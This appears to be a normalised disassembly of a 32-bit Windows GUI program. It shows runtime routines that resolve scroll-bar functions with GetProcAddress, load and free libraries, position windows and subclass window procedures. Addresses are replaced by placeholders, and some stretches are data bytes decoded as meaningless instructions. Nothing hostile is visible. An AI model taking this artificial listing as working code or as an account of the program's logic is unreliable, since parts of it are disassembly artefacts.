je r-xdata
push 0x3ff
lea eax [ ebp - 0x418 ]
push eax
push r-xdata
push r-xdata
push r-xdata
call GetProfileStringA
lea eax [ ebp - 0x418 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
call sub_423be0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
call GetLastError
cmp eax 0x7b
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4243fc
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
call sub_40c774
lea edx [ ebp - 0x41c ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x41c ]
call sub_423c14
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_40441c
push eax
push 0x0
mov eax [ ebx + 0x4 ]
call sub_40441c
push eax
mov eax [ ebx + 0x8 ]
call sub_40441c
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4240c0
call sub_403a44
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x420 ]
mov edx [ ebp - 0x14 ]
call sub_404154
mov edx [ ebp - 0x420 ]
pop eax
call sub_407bf4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424820
lea eax [ ebp - 0x424 ]
mov edx 0x3
call sub_403f80
retn
sub_42483c
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x10 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea eax [ esi + 0x10 ]
call sub_40ccd0
inc eax
mov ebx eax
xor edi edi
mov edx edi
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403224
inc edi
dec ebx
jne r-xdata
sub_4248a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4248d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4248dc
retn
mov eax [ rw-data ]
call sub_403224
sub_4248e8
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42491c
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_424944
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_424bc6
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424bed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424bf4
retn
sub_424c08
push esp
dec esp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 2 + 0x42 ] bl
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x54004010 ]
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add ah dl
dec esp
inc edx
add al bl
dec esp
inc edx
add [ esi ] cl
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x48 ] si
dec esp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
dec esp
inc edx
add [ eax + eax ] bl
add [ eax ] al
or [ edx + eax * 2 ] cl
push esp
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ ecx * 2 + 0x4d4c0042 ] bl
inc edx
add [ eax + 0x4d ] bl
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_424cdc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031f4
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_424d1c
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_424d74
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424d99
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424da0
retn
sub_424dac
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424d64
xor eax eax
push ebp
push sub_424f63
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f6a
mov eax [ rw-data ]
call sub_424d6c
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_424f6c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_424d64
xor eax eax
push ebp
push sub_42531f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425326
mov eax [ rw-data ]
call sub_424d6c
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_4256d0
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_4256f8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425740
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425747
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403224
call sub_424dac
cmp [ rw-data ] 0x0
jg r-xdata
sub_425768
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42578d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425794
retn
sub_4257a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4257c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4257cc
retn
sub_4257d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4257fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425804
retn
sub_425810
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425835
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42583c
retn
sub_425848
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42586d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425874
retn
sub_425880
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4258a5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4258ac
retn
sub_4258b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4258dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4258e4
retn
sub_425900
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425925
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42592c
retn
sub_425938
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42595d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425964
retn
sub_425974
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ edx + 0x42 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
pop ecx
inc edx
add [ edx + ebx * 2 ] bl
inc edx
add [ eax ] bl
add [ eax ] al
in al 0x21
inc ecx
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add [ ecx + 0x42 ] dl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add al bh
pushad
inc edx
add [ eax + 0x6800413f ] ah
xchg edi eax
inc ecx
add [ esi + edi - 0x67bfffbf ] bh
inc ecx
add [ edi + edx * 4 ] cl
inc ecx
add [ eax - 0x68 ] dl
inc ecx
add [ eax - 0x67 ] cl
inc ecx
add [ eax - 0x65 ] bh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax - 0x4fffbe65 ] al
pushad
inc edx
add al bl
popad
inc edx
add [ ecx ] ch
inc edx
add [ edx ] ah
inc edx
add [ eax + 0x2a ] ch
inc eax
add [ 0x10000200 ] al
add [ edx - 0x11001100 ] eax
jmp eax
sub_425e64
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ edi ] al
inc ebx
outsd
insb
insb
popad
je r-xdata
cmp al 0x10
inc eax
add [ eax ] ch
add bh bh
push 0x1ff0000
cmp al 0x10
inc eax
add [ eax + eax ] ch
dec [ eax ]
push 0x10042
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop es
add [ esi ] al
inc ebx
outsd
jo r-xdata
add [ eax ] al
jmp [ ebx ]
popad
js r-xdata
js r-xdata
jae r-xdata
add [ 0x72500a00 ] cl
imul ebp [ esi + 0x74 ] 0x676e6152
cmp al 0x10
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ esi ] al
push esp
outsd
push eax
popad
mov eax eax
inc edx
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
dec edi
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
pop es
dec ebp
popad
js r-xdata
pop es
dec ebp
imul ebp [ esi + 0x50 ] 0x3c656761
adc [ eax ] al
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
or [ esi + 0x72 ] al
outsd
insd
push eax
popad
cmp al 0x10
inc eax
add [ eax + eax ] ah
jmp [ eax + eax ]
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
imul ebp [ edi + 0x6e ] 0x40100073
add [ edx ] ah
add bh bh
bound eax [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
or edx [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x69466f54
insb
mov eax 0x6300425c
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4591d0
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_455770
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_455770
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_458ed4
mov edi eax
mov eax ebx
call sub_458eb8
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_458ea0
mov edi eax
mov eax ebx
call sub_458eec
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_425f94
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4591d0
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_455770
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_455770
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_458ed4
mov edi eax
mov eax ebx
call sub_458eb8
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_458ea0
mov edi eax
mov eax ebx
call sub_458eec
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_426048
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_425f94
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_4260b0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4193f0
mov [ esi + 0x30 ] 0x1
push esi
push sub_42618c
call sub_41a480
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_4260f8
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41943c
test bl bl
jle r-xdata
call sub_41a518
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_42612c
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_45bbc4
mov cl 0x1
sub_426154
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_40345c
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42618c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4261b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_426224
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_4525b4
mov [ ebp - 0x14 ] eax
call sub_4524d0
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4262e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b4b4
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_4262b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4262c0
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b510
retn
sub_4262c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4262ee
mov eax [ ebp - 0x14 ]
call sub_452668
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_4524d8
retn
sub_426320
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4260b0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ esi + 0x60 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_426364
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x60 ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4260f8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_426394
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
xor eax eax
push ebp
push sub_426431
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x44 ]
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebx ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408b70
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
mov edx esi
add dl 0x41
call sub_404144
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404268
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
pop ecx
call sub_414ecc
inc esi
add ebx 0x4
cmp esi 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426438
